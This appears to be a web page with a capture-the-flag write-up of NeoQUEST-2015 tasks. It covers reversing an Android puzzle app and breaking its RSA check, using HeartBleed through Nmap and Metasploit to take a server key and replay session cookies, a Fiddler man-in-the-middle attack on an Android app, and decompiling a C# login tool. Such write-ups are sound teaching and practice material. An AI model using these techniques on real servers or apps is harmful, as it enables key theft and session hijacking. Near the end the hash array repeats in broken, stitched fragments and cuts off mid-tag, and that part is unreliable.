<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>NeoQUEST-2015: HeartBleed, Android and a little bit of reverse</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hi, Habr! Summer is coming, and with it - the ‚Äúconfrontation‚Äù NeoQUEST-2015. Registration for the event is already open, and admission is free. Guests...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>NeoQUEST-2015: HeartBleed, Android and a little bit of reverse</h1><div class="post__text post__text-html js-mediator-article"><img align="left" src="https://habrastorage.org/files/bb3/631/4ec/bb36314ecd6349568ba79df767d024bb.png">  Hi, Habr!  Summer is coming, and with it - the ‚Äúconfrontation‚Äù NeoQUEST-2015.  <a href="http://neoquest.ru/timeline.php%3Fyear%3D2015">Registration</a> for the event is already open, and admission is free.  Guests are waiting for reports and master classes on cyber security, contests, gifts and much more!  All this is already in July, and we continue to analyze the tasks of the online stage NeoQUEST-2015.  In this article: <br><ul><li>  <b>"Mystic Square"</b> - "tag" on Android and the attack on the RSA cryptosystem </li><li>  <b>‚ÄúMason connect‚Äù</b> - analysis of network traffic dump with subsequent implementation of the HeartBleed vulnerability </li><li>  <b>"RaSSLedovanie"</b> - Man-in-the-Middle attack on Android </li><li>  <b>"Friendship and Brotherhood"</b> - reverse application on C # </li></ul><br><a name="habracut"></a><br><h5>  <b>1. "Mystic Square" - "tag" on Android</b> </h5><br><img align="left" src="https://habrastorage.org/files/45c/851/e80/45c851e804a648d39af2f489b9b51c93.jpg"><br><h6>  <b>Putting "tag"</b> </h6><br>  So, initially we have a file game.apk, it is clear that this is nothing but an application for Android. <br><br>  At first it is worth running it - and we see that this is a simple children's game ‚Äútag‚Äù.  Do you really need to collect a picture to complete the task on ctf?  Exactly!  You can assemble a picture either in the application itself, or by pulling pictures from the application resources (res / drawable directories) and putting the parasl in a graphic editor.  Collected the picture and got some string "10838670582455823456841": <br><br><h6>  <b>Reverse Android application</b> </h6><br>  What to do next?  The first thought is to reverse the Android application.  We pull out the classes.dex file from the application, this is the bytecode of the program used in Android.  Then, using the dex2jar utility, we get the classes.dex.dex2jar.jar file, which is conveniently viewed using the jd-gui program. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Entry point is the MyActivity class: <br><br><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">boolean</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">onKeyDown</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(</span></span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">int</span></span></span></span><span class="hljs-function"><span class="hljs-params"> paramInt, KeyEvent paramKeyEvent)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">switch</span></span> (paramInt) { <span class="hljs-keyword"><span class="hljs-keyword">default</span></span>: <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onKeyDown(paramInt, paramKeyEvent); <span class="hljs-keyword"><span class="hljs-keyword">case</span></span> <span class="hljs-number"><span class="hljs-number">82</span></span>: } startActivity(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Intent(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>, InputOne.class)); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; }</code> </pre> <br><br>  It is seen that when you click on the button is a call InputOne.  Let's look at the InputOne class: <br><br><pre> <code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">InputOne</span></span></span><span class="hljs-class"> </span><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">extends</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Activity</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">protected</span></span> void onCreate(<span class="hljs-type"><span class="hljs-type">Bundle</span></span> paramBundle) { <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>.onCreate(paramBundle); setContentView(<span class="hljs-number"><span class="hljs-number">2130903041</span></span>); <span class="hljs-type"><span class="hljs-type">EditText</span></span> localEditText = (<span class="hljs-type"><span class="hljs-type">EditText</span></span>)findViewById(<span class="hljs-number"><span class="hljs-number">2131034112</span></span>); ((<span class="hljs-type"><span class="hljs-type">Button</span></span>)findViewById(<span class="hljs-number"><span class="hljs-number">2131034113</span></span>)).setOnClickListener(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-type"><span class="hljs-type">View</span></span>.<span class="hljs-type"><span class="hljs-type">OnClickListener</span></span>(localEditText) { public void onClick(<span class="hljs-type"><span class="hljs-type">View</span></span> paramView) { <span class="hljs-type"><span class="hljs-type">String</span></span> str1 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">val</span></span>$editText.getText().toString(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-type"><span class="hljs-type">File</span></span>(<span class="hljs-string"><span class="hljs-string">"/sdcard/key.txt"</span></span>).exists()) { <span class="hljs-type"><span class="hljs-type">String</span></span> str2 = <span class="hljs-type"><span class="hljs-type">Simple</span></span>.<span class="hljs-type"><span class="hljs-type">Decrypt</span></span>(str1); <span class="hljs-type"><span class="hljs-type">Toast</span></span>.makeText(<span class="hljs-type"><span class="hljs-type">InputOne</span></span>.<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getBaseContext(), str2, <span class="hljs-number"><span class="hljs-number">1</span></span>).show(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-type"><span class="hljs-type">Simple</span></span>.get(str1); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (<span class="hljs-type"><span class="hljs-type">IOException</span></span> localIOException) { localIOException.printStackTrace(); } } }); } }</code> </pre><br><br>  In this class, the string entered in the input field is taken, the presence of the file ‚Äú/sdcard/key.txt‚Äù is checked.  If it is, the Simple class's Decrypt method is called; if it does not exist, the get method of the same class is called.  The string entered in the input field is transferred to each of these methods. <br>  We don‚Äôt have this file - see the get method. <br><br><pre> <code class="hljs pgsql"><span class="hljs-built_in"><span class="hljs-built_in">public</span></span> static <span class="hljs-type"><span class="hljs-type">void</span></span> <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(String paramString) throws IOException { QueryString localQueryString = <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> QueryString().<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>("message", paramString); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (localQueryString == <span class="hljs-keyword"><span class="hljs-keyword">null</span></span>) <span class="hljs-keyword"><span class="hljs-keyword">Log</span></span>.e("Info", "NULL"); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (URLConnection localURLConnection = <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> URL("http://79.175.2.83/0b32bd28a8632f9895f9d5d8a6c51dad/game.php").openConnection(); ; localURLConnection = <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> URL("http://79.175.2.83/0b32bd28a8632f9895f9d5d8a6c51dad/game.php?" + localQueryString).openConnection()) { localURLConnection.getInputStream(); String str = readStreamToString(localURLConnection.getInputStream(), "UTF-8"); <span class="hljs-keyword"><span class="hljs-keyword">Log</span></span>.e("Info", str); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!str.equals("Error")) { FileWriter localFileWriter = <span class="hljs-built_in"><span class="hljs-built_in">new</span></span> FileWriter(<span class="hljs-built_in"><span class="hljs-built_in">new</span></span> File("/sdcard/key.txt")); localFileWriter.<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>(str); localFileWriter.<span class="hljs-keyword"><span class="hljs-keyword">close</span></span>(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span>; } }</code> </pre><br><br>  This method forms a GET request of the form ‚Äúhttp://79.175.2.83/0b32bd28a8632f9895f9d5d8a6c51dad/game.php?message= 'the entered string'‚Äù, and the result, if it is not ‚ÄúError‚Äù, saves to the file ‚Äú/sdcard/key.txt ". <br><br>  Now you need to enter the code received from the game into the application, and it will download the key.txt file to the device‚Äôs memory card.  The file has the following form: <br><br>  5890287499022904927250918089905639153507 <br>  3148792732424313619076650032785631134 <br>  key = a0bf0f01485a59addf4f9374e7c2a7b5 <br><br><h6>  <b>"Attention - cryptography!"</b> </h6><br>  The first key is obtained, now the task of attentiveness and some cryptography.  We have left the unknown method Decrypt of class Simple, its call occurs if you fill that very line of input in the presence of the file "/sdcard/key.txt".  But first, let's look at what is happening there. <br><br><pre> <code class="hljs cs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> String </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Decrypt</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">String paramString</span></span></span><span class="hljs-function">)</span></span> { ArrayList localArrayList = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ArrayList(); <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { Scanner localScanner = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> Scanner(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(<span class="hljs-string"><span class="hljs-string">"/sdcard/key.txt"</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (localScanner.hasNextLine()) localArrayList.<span class="hljs-keyword"><span class="hljs-keyword">add</span></span>(localScanner.nextLine()); } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (FileNotFoundException localFileNotFoundException) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"0"</span></span>; } BigInteger localBigInteger = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BigInteger((String)localArrayList.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-number"><span class="hljs-number">0</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BigInteger((String)localArrayList.<span class="hljs-keyword"><span class="hljs-keyword">get</span></span>(<span class="hljs-number"><span class="hljs-number">1</span></span>)).modPow(e, n).<span class="hljs-keyword"><span class="hljs-keyword">equals</span></span>(localBigInteger)) { <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> File(<span class="hljs-string"><span class="hljs-string">"/sdcard/key.txt"</span></span>).delete(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> localBigInteger.modPow(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> BigInteger(paramString), n).toString(<span class="hljs-number"><span class="hljs-number">16</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"0"</span></span>; }</code> </pre><br><br>  So, we have the usual <a href="https://ru.wikipedia.org/wiki/RSA">RSA</a> , we know the public key (e, n), immediately there is a desire to find d, enter it into the input line and get the key, it is, but attentiveness is above all.  Let's see what happens here. <br><br>  Let the first line of our file be sign, and the second mes.  The program checks that mes ‚â° sign <sup>e</sup> (mod n), after that mes <sup>d</sup> (mod n) is calculated.  And now let's think about what it is.  We had a key key, it was encrypted with d and received mes ‚â° key <sup>d</sup> (mod n), and then signed mes ‚â° sign <sup>e</sup> (mod n) and wrote it all into a file.  With a little care and we see that key ‚â° sign (mod n), which means that the key is the second line in the file, namely, ‚Äú3148792732424313619076650032785631134 = 0025e6f77c39943f83d1d2f8770a1a79‚Äù.  And now the second test for attentiveness: all keys are 128-bit hash values, which means that the key is 025e6f77c39943f83d1d2f8770a1a79, and only this way! <br><br>  The variant of passing for less attentive is to factor n into factors 8286006298514071265735892332006920710569 = 81227239281928373027 * 102010192292200202947, calculate the Euler function from n: <br><br>  œÜ (n) = (81227239281928373027-1) * (102010192292200202947-1) = 8286006298514071265552654900432792134596 <br><br>  It remains only to calculate d, how multiplicatively inverse to e modulo n: d = 470882518138148676109255540092728302699. <br><br>  Thus, the participants needed to collect a picture in the Fifteen game, reverse the application a bit, enter the key in the input line found, and either find an error in the implementation of the RSA scheme (being very careful!), Or launch a decomposition attack.  By the way, you can see how the quest participants completed this task <a href="https://forum.reverse4you.org/showthread.php%3Ft%3D1978">here</a> and <a href="http://yantayga.livejournal.com/99988.html">here</a> (the second link contains a rather large overview of several tasks NeoQUEST-2015). <br><br><h5>  <b>2. "Mason-connect" - we realize HeartBleed</b> </h5><br>  By assignment, the Neoquest member is given a network dump file.  Opening it, for example, in Wireshark we will see the following packages: <br><br><img src="https://habrastorage.org/files/3f3/5a8/c82/3f35a8c82fe443d388612dc9e368d361.jpg"><br><br>  From this dump, we see that https traffic between the two nodes is collected here, the client connects to the server with the IP address 79.175.2.84 and uses the standard port 443. We try to access this server and get the following answer: <br><br>  Sorry, we don't know you <br><br>  The next step would be to scan this server in order to find vulnerabilities.  What if we are lucky and we find some loophole!  Remembering port 443, we first check our server for the known SSL vulnerability Heartbleed.  For this we can use the corresponding script from Nmap Scripting Engine: <br><br><img src="https://habrastorage.org/files/4f9/727/154/4f972715461d49218ca961476c0978ec.jpg"><br><br>  Luck!  We did find a known SSL vulnerability - HeartBleed. <br>  For us, the most important thing is that, having used it, we can get the server's secret key and decrypt our dump.  No sooner said than done!  We take Metasploit, run the openssl_heartbleed script - and with such uncomplicated movements we get our secret key: <br><br><img src="https://habrastorage.org/files/7dc/739/852/7dc739852d9040a6a7d9c282bf9951c8.jpg"><br><br>  The first step is made, having received the key, we can decrypt the traffic and get more information from it.  Let's go back to Wireshark and upload our key to decrypt the traffic.  After decryption we get the following: <br><br><img src="https://habrastorage.org/files/ecc/a19/d14/ecca19d14543435a9a4e4d62f57c1411.jpg"><br><br>  In the decrypted dump, we are primarily interested in the GET request.  We see that there are transmitted cookies: id and hash.  Apparently, they are used for authentication. <br><br><img src="https://habrastorage.org/files/fff/25f/66d/fff25f66d23d4ac1ae987eda9840309e.jpg"><br><br>  Also noteworthy is the unusual User-Agent: ‚ÄúGRAND LODGE‚Äù.  By sending a packet with the same cookies and User-Agent, we will receive the following response: <br><br><img src="https://habrastorage.org/files/518/d6b/22d/518d6b22d5d14466be50cb84dc7f399e.jpg"><br><br>  Following the link, we find our key sought! <br><br><h6>  <b>3. "raSSLedovanie" - Man-in-the-Middle attack on Android</b> </h6><br>  We download the ssviewer.apk APK file from the task and install it on the Android emulator.  Having started the application, we see the interface: <br><br><img src="https://habrastorage.org/files/2b6/d61/e94/2b6d61e94c76414894b2c125fe84ef18.jpg"><br><br>  Press the button: <br><br><img src="https://habrastorage.org/files/b11/213/aa7/b11213aa75364dabaccfb66c59988de9.jpg"><br><br>  The message ‚Äú200 ok‚Äù indicates the network interaction of the application with a server.  Let's try to look with a sniffer (for example, take <a href="http://www.telerik.com/fiddler">Fiddler</a> ).  We see the appeal to <a href="https://db765.ru/">db765.ru</a> .  We will try to conduct an MITM attack. <br>  Configure Fiddler and export its root certificate: <br><br><img src="https://habrastorage.org/files/01a/0b0/944/01a0b094448e491d8ec8cc7bf4906a7d.jpg"><br><br>  After that, we will add the certificate in Android to the trusted ones.  Install a proxy for listening to traffic in Fiddler. <br><br><img src="https://habrastorage.org/files/c95/007/b5e/c95007b5e9a94be4a22f462bb87e60c3.jpg"><br><br>  Run the application again and catch the server response in the sniffer. <br><br><img src="https://habrastorage.org/files/57c/3e2/52f/57c3e252f7f442d29fa2cf19993f077d.jpg"><br><br>  In the answer we see base64.  Unpack and get a zip-archive in which there is a picture with the answer "SSLK3YDB765"! <br><br>  As practice has shown, a large number of participants handled this task, and our winner, n0n3m4, even wrote a write-up with the intriguing title <a href="http://www.suslopas.pw/2015/03/neoquest-2015-rassledovanie-13.html">‚ÄúNeoQUEST 2015: how to solve a raSSLedovanie in 13 minutes‚Äù</a> . <br><br><h6>  <b>4. ‚ÄúFriendship and Brotherhood‚Äù - reverse the application in C #</b> </h6><br>  All that was given to the participants is two files: login.exe and a .so file.  After running login.exe, the application asks to enter a login: <br><br><img src="https://habrastorage.org/files/162/f23/4f0/162f234f0ca049898008d14c52e5bbf7.jpg"><br><br><h6>  <b>Part one</b> </h6><br>  Take the .NET Reflector and decompile it.  After a brief search, we‚Äôll find the following code: <br><br><pre> <code class="hljs kotlin"><span class="hljs-keyword"><span class="hljs-keyword">private</span></span> void textBox1_TextChanged(<span class="hljs-keyword"><span class="hljs-keyword">object</span></span> sender, EventArgs e) { string text = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.textBox1.Text; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (text.Length == <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.label1.Text = <span class="hljs-string"><span class="hljs-string">"Enter you login"</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hashes.Contains&lt;string&gt;(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.GetHashString(text))) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.label1.Text = <span class="hljs-string"><span class="hljs-string">"Incorrect login!"</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (text.Length == <span class="hljs-number"><span class="hljs-number">0x20</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.label1.Text = <span class="hljs-string"><span class="hljs-string">"You have successfully logged in!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.groupBox1.Enabled = <span class="hljs-literal"><span class="hljs-literal">false</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.tcpSocket = new TcpClient(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.host, <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.port); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.groupBox2.Visible = <span class="hljs-literal"><span class="hljs-literal">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.timer1.Start(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.label1.Text = <span class="hljs-string"><span class="hljs-string">"Enter next character of your login"</span></span>; } }</code> </pre><br><br>  We are interested in the line: <br><br><pre> <code class="hljs kotlin"><span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hashes.Contains&lt;string&gt;(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.GetHashString(text)))</code> </pre><br><br>  The code checks the hashes array for the hash from the current login entered. <br>  Hash function: <br><br><pre> <code class="hljs cs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">string</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">GetHashString</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">string</span></span></span></span><span class="hljs-function"><span class="hljs-params"> s</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] bytes = Encoding.ASCII.GetBytes(s); <span class="hljs-keyword"><span class="hljs-keyword">byte</span></span>[] buffer2 = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> MD5CryptoServiceProvider().ComputeHash(bytes); <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> str = <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Empty; <span class="hljs-keyword"><span class="hljs-keyword">foreach</span></span> (<span class="hljs-keyword"><span class="hljs-keyword">byte</span></span> num <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> buffer2) { str = str + <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>.Format(<span class="hljs-string"><span class="hljs-string">"{0:x2}"</span></span>, num); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> str; }</code> </pre><br><br>  An array of hashes: <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hashes = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>[] { <span class="hljs-string"><span class="hljs-string">"dfa7b3505d612417911b86b89f869d6c"</span></span>, <span class="hljs-string"><span class="hljs-string">"73b6951965fda60be0c69da1411e59af"</span></span>, <span class="hljs-string"><span class="hljs-string">"4ad9eab6a9bd83eec4723d05444059e2"</span></span>, <span class="hljs-string"><span class="hljs-string">"4f60dca64aedd943e4fccb8bbf18e25c"</span></span>, <span class="hljs-string"><span class="hljs-string">"9ed2ac984ed7182a4974a4bab0ad8fcd"</span></span>, <span class="hljs-string"><span class="hljs-string">"826fc5d7998c16eeb77abc00702a00ab"</span></span>, <span class="hljs-string"><span class="hljs-string">"4ec559ee5a6249f0c69ab8ff9b804072"</span></span>, <span class="hljs-string"><span class="hljs-string">"0eebdd1e6d919d04cdee9646607786c3"</span></span>, <span class="hljs-string"><span class="hljs-string">"172cfbcb9d8de7425233fd7183f43c21"</span></span>, <span class="hljs-string"><span class="hljs-string">"7174ce70d0702083e26d285196d36cf2"</span></span>, <span class="hljs-string"><span class="hljs-string">"77526663ec282d1d1f62229ab980edd5"</span></span>, <span class="hljs-string"><span class="hljs-string">"c7f399fb9f981ba2445ba573ec668cef"</span></span>, <span class="hljs-string"><span class="hljs-string">"efa9d9d29367af2b3c1cc1494f882f2d"</span></span>, <span class="hljs-string"><span class="hljs-string">"01e5f7d323222fd161fcbd0b32f26b2b"</span></span>, <span class="hljs-string"><span class="hljs-string">"83daec0d569704618ecf60d19b031082"</span></span>, <span class="hljs-string"><span class="hljs-string">"a2c2c74263df7545cb857b69ce5820b2"</span></span>, <span class="hljs-string"><span class="hljs-string">"ac13be701bc79036602ae9f355e6c389"</span></span>, <span class="hljs-string"><span class="hljs-string">"d33bf0c58b48508c706d32c6e8a171d4"</span></span>, <span class="hljs-string"><span class="hljs-string">"138378fc00ad7d559f0418019e750b19"</span></span>, <span class="hljs-string"><span class="hljs-string">"39eb98f5edec84e35f52feff51c94a25"</span></span>, <span class="hljs-string"><span class="hljs-string">"3ff5db4ebc8437f338ce978fddcfb334"</span></span>, <span class="hljs-string"><span class="hljs-string">"e1cd7a2a000a2fe69f909a2e46dab073"</span></span>, <span class="hljs-string"><span class="hljs-string">"bf80eafce6f8d51220dd6603295852d5"</span></span>, <span class="hljs-string"><span class="hljs-string">"f8bc2fbe2c937ea5b5e8839cbea69491"</span></span>, <span class="hljs-string"><span class="hljs-string">"e8bb39c756ad2b46a80b3f07c8422037"</span></span>, <span class="hljs-string"><span class="hljs-string">"a3d4832c6cc0b51163e04301e6a17b55"</span></span>, <span class="hljs-string"><span class="hljs-string">"bc7a6cff6c8507488e186d378ec12b38"</span></span>, <span class="hljs-string"><span class="hljs-string">"deaeb78d2c64a16cecd1a718e226db52"</span></span>, <span class="hljs-string"><span class="hljs-string">"c81e728d9d4c2f636f067f89cc14862c"</span></span>, <span class="hljs-string"><span class="hljs-string">"7742638106aea26564f3f6fa02fe1265"</span></span>, <span class="hljs-string"><span class="hljs-string">"7c8104aa5e88bee40658c61c5f869284"</span></span>, <span class="hljs-string"><span class="hljs-string">"71e157ffdf45f4946e95d0ac115466a1"</span></span> };</code> "4ad9eab6a9bd83eec4723d05444059e2", "4f60dca64aedd943e4fccb8bbf18e25c", "9ed2ac984ed7182a4974a4bab0ad8fcd", "826fc5d7998c16eeb77abc00702a00ab", "4ec559ee5a6249f0c69ab8ff9b804072", "0eebdd1e6d919d04cdee9646607786c3", "172cfbcb9d8de7425233fd7183f43c21", "7174ce70d0702083e26d285196d36cf2", "77526663ec282d1d1f62229ab980edd5", "c7f399fb9f981ba2445ba573ec668cef", "efa9d9d29367af2b3c1cc1494f882f2d <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.hashes = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span>[] { <span class="hljs-string"><span class="hljs-string">"dfa7b3505d612417911b86b89f869d6c"</span></span>, <span class="hljs-string"><span class="hljs-string">"73b6951965fda60be0c69da1411e59af"</span></span>, <span class="hljs-string"><span class="hljs-string">"4ad9eab6a9bd83eec4723d05444059e2"</span></span>, <span class="hljs-string"><span class="hljs-string">"4f60dca64aedd943e4fccb8bbf18e25c"</span></span>, <span class="hljs-string"><span class="hljs-string">"9ed2ac984ed7182a4974a4bab0ad8fcd"</span></span>, <span class="hljs-string"><span class="hljs-string">"826fc5d7998c16eeb77abc00702a00ab"</span></span>, <span class="hljs-string"><span class="hljs-string">"4ec559ee5a6249f0c69ab8ff9b804072"</span></span>, <span class="hljs-string"><span class="hljs-string">"0eebdd1e6d919d04cdee9646607786c3"</span></span>, <span class="hljs-string"><span class="hljs-string">"172cfbcb9d8de7425233fd7183f43c21"</span></span>, <span class="hljs-string"><span class="hljs-string">"7174ce70d0702083e26d285196d36cf2"</span></span>, <span class="hljs-string"><span class="hljs-string">"77526663ec282d1d1f62229ab980edd5"</span></span>, <span class="hljs-string"><span class="hljs-string">"c7f399fb9f981ba2445ba573ec668cef"</span></span>, <span class="hljs-string"><span class="hljs-string">"efa9d9d29367af2b3c1cc1494f882f2d"</span></span>, <span class="hljs-string"><span class="hljs-string">"01e5f7d323222fd161fcbd0b32f26b2b"</span></span>, <span class="hljs-string"><span class="hljs-string">"83daec0d569704618ecf60d19b031082"</span></span>, <span class="hljs-string"><span class="hljs-string">"a2c2c74263df7545cb857b69ce5820b2"</span></span>, <span class="hljs-string"><span class="hljs-string">"ac13be701bc79036602ae9f355e6c389"</span></span>, <span class="hljs-string"><span class="hljs-string">"d33bf0c58b48508c706d32c6e8a171d4"</span></span>, <span class="hljs-string"><span class="hljs-string">"138378fc00ad7d559f0418019e750b19"</span></span>, <span class="hljs-string"><span class="hljs-string">"39eb98f5edec84e35f52feff51c94a25"</span></span>, <span class="hljs-string"><span class="hljs-string">"3ff5db4ebc8437f338ce978fddcfb334"</span></span>, <span class="hljs-string"><span class="hljs-string">"e1cd7a2a000a2fe69f909a2e46dab073"</span></span>, <span class="hljs-string"><span class="hljs-string">"bf80eafce6f8d51220dd6603295852d5"</span></span>, <span class="hljs-string"><span class="hljs-string">"f8bc2fbe2c937ea5b5e8839cbea69491"</span></span>, <span class="hljs-string"><span class="hljs-string">"e8bb39c756ad2b46a80b3f07c8422037"</span></span>, <span class="hljs-string"><span class="hljs-string">"a3d4832c6cc0b51163e04301e6a17b55"</span></span>, <span class="hljs-string"><span 